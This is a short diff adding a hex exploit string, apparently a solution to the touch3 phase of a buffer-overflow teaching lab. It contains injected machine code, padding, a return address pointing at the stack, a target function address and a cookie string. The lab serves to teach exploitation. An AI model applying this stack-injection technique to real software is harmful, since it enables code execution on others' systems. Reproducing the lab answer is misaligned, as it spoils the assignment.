@@ -1,0 +1,6 @@
+48 c7 c7 98 74 61 55 c3 /* rsp + 28 the address where the cookie is present */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding */
+70 74 61 55 00 00 00 00 /* return address ($rsp) */
+1f 1c 40 00 00 00 00 00 /* touch3 address -- get this from the rtarget dump file */
+35 30 66 61 37 33 61 61 /* cookie string */
